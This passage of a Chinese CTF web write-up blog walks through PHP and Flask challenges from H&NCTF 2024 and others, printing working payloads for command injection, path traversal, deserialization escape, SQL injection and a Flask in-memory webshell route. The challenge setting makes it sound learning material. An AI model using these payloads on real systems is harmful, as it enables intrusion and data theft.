class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;i hate this&quot;</span>);      </span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">strCheck</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>shell_exec执行的命令看不到回显，利用tee命令，用于将命令的输出同时保存到文件<br>然后再访问相应的文件得到结果</p><p>get传参：<br><code>?cmd=tac fl* | tee 1.txt</code><br>然后访问 &#x2F;1.txt</p><h3 id="uu包含"><a href="#uu包含" class="headerlink" title="uu包含"></a>uu包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>buu上的一道原题<br>mb_substr()：返回提取的子字符串。第二个参数表示开始位置，第三个参数表示提取的子字符串的长度</p><p>mb_strpos()：用于查找一个字符串在另一个字符串中首次出现的位置</p><p>in_array() : 用于检查一个值是否存在于数组中</p><p>所以参数里面必须要有白名单里面的值才能返回true,<br>需要一个？截取前面的值是白名单的值，然后再后面目录穿越，include包含文件<br>hint.php给个提示flag再ffffllllaaaagggg里面</p><p>get传参：<br><code>?file=hint.php?../../../../../ffffllllaaaagggg </code></p><h3 id="is-serialize"><a href="#is-serialize" class="headerlink" title="is_serialize"></a>is_serialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$hhh</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$xxx</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hhh</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;hhh = <span class="variable">$hhh</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kong</span>=<span class="string">&#x27;kong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$good</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;good&quot;</span>,<span class="string">&quot;hint&quot;</span>,<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;php&quot;</span>,<span class="string">&quot;safe&quot;</span>);</span><br><span class="line">  <span class="variable">$good</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$good</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$good</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ttt&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$aaa</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ttt&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line"><span class="variable">$get</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">class1</span>(<span class="variable">$get</span>));</span><br><span class="line"><span class="variable">$bbb</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$get</span>));</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$aaa</span>-&gt;plb==<span class="string">&quot;plb&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;continue     \n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$bbb</span>-&gt;xxx == <span class="string">&#x27;yesyesyes&#x27;</span>) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span><span class="string">&quot;???&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>给class2 动态添加属性 plb令它的值为plb</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kong</span> = <span class="string">&#x27;kong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;plb = <span class="string">&quot;plb&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:6:&quot;class2&quot;:2:&#123;s:4:&quot;kong&quot;;s:4:&quot;kong&quot;;s:3:&quot;plb&quot;;s:3:&quot;plb&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>php反序列化字符串逃逸<br>根据filter()函数，由php转化成hack，会多出一个字符，然后再计算一下需要多少个字符就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最终的payload：</span><br><span class="line"></span><br><span class="line">?ttt=O:6:&quot;class2&quot;:2:&#123;s:4:&quot;kong&quot;;s:4:&quot;kong&quot;;s:3:&quot;plb&quot;;s:3:&quot;plb&quot;;&#125;&amp;get=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:3:&quot;xxx&quot;;s:9:&quot;yesyesyes&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;suisui&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$liang</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;suisui&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;| |tac|[0-9]|\\$|\*|more|sort|cat|tail|nl|sed|flag|cut|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$liang</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$liang</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><code>/dev/null 2&gt;&amp;1</code>语句，就是不进行回显,无法看到结果<br>可以通过 <code>;</code> 或者 <code>||</code> 等命令分隔符进行命令分隔 ，从而绕过</p><p><code>&lt;&gt;</code> 替代空格，<code>\</code> 字符拼接，绕过flag<br>get传参：<br><code>suisui=head&lt;&gt;fla\gggg.php||</code></p><h3 id="php1来咯"><a href="#php1来咯" class="headerlink" title="php1来咯"></a>php1来咯</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;ssd.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ssdxgy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ssdxgy</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;ssdxgy&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$ssdxgy</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ssd\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ssd_xgy/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ssd_xgy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>分析代码，最终要利用highlight_file 包含一个文件，应该就是ssd.php了<br>basename(): 用于获取文件路径中的基本文件名部分, 比如就是 basename(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php’)  –&gt; index.php<br>这道题需要的就是basename之后的值为 ssd.php</p><p><code>preg_match(&#39;/ssd\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code> 需要绕过这个正则<br>需要在后面加上一个非ascii码的值就可以</p><p>然后就是ssd_xgy的值不能为空，随便传一个参数就行<br>php非法传参，[ 会转化成 _</p><p>get传参：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/ssd.php/%88?ssd[xgy=1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTF-web</title>
      <link href="/2024/06/03/H&amp;NCTF/"/>
      <url>/2024/06/03/H&amp;NCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<br>GET：<code>?moran=flag&amp;a[]=cat /flag&amp;b=system</code><br>POST：<code>task=array_walk($_GET[&#39;a&#39;],$_GET[&#39;b&#39;])&amp;flag=please_give_me_Flag</code></p><p>首先绕过 $str2 ,<code>preg_match(&#39;/please_give_me_flag/&#39;,$str2)</code>，用大小写绕过，刚开始没看到没有 i ,搞半天绕不过</p><p>然后需要绕过  $str1  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;,$str1)</span><br></pre></td></tr></table></figure><p>找php的相关的函数，绕过限制<br>比如： array_walk()  没有被过滤<br>用法：array_walk ( array &amp;$array , callable $callback [, mixed $userdata &#x3D; NULL ] )</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a[]=phpinfo()&amp;b=assert</span></span><br><span class="line"><span class="comment">//xxx.php?a[]=whoami&amp;b=system</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h2><p>非预期了，可以直接在log文件中找到payload，直接得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/home/index/h_n?name[0]=exp&amp;name[1]=%3d%27test123%27%20union%20select%201,flag%20from%20flag</span><br></pre></td></tr></table></figure><p>H&amp;NCTF{Cjp_0ef904a9-53aa-40c4-9223-f5b9cd8e39f9}</p><h2 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h2><p><img src="/2024/06/03/H&NCTF/image-20240528173614596.png" alt="image-20240528173614596"></p><p>只执行一次，注入内存马，还没学过内存马，看完wp，网上学了一下内存马</p><p>在&#x2F;Adventure路由命令执行(不晓得为啥那些师傅们一眼能看出来是POST方法，拿到这道题目我都不晓得要干啥，唉)</p><p>payload: (网上应该有很多这种payload，很多都可以用)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].<span class="title function_ invoke__">add_url_rule</span>(<span class="string">&#x27;/shell&#x27;</span>, <span class="string">&#x27;shell&#x27;</span>, <span class="attr">lambda</span>: <span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;os&#x27;</span>).<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cat /flag&#x27;</span>).<span class="title function_ invoke__">read</span>())</span><br><span class="line">    </span><br><span class="line"><span class="comment">//直接 cat /flag 是因为题目说了只有执行一次成功的命令就会在/flag文件下存在flag</span></span><br></pre></td></tr></table></figure><p>用其他的师傅的payload可以在  &#x2F;shell?cmd&#x3D;   执行相应的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">render_template_string</span>(<span class="string">&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后再访问 &#x2F;shell 路由就会出现 flag 了 </p><p><img src="/2024/06/03/H&NCTF/image-20240528181132636.png" alt="image-20240528181132636"></p><p><img src="/2024/06/03/H&NCTF/image-20240528181159675.png" alt="image-20240528181159675"></p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><p><a href="https://www.cnblogs.com/Rxuxin/articles/18190160">https://www.cnblogs.com/Rxuxin/articles/18190160</a><br>看wp复现</p><p>根据题目的描述进入 &#x2F;hint，有源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span 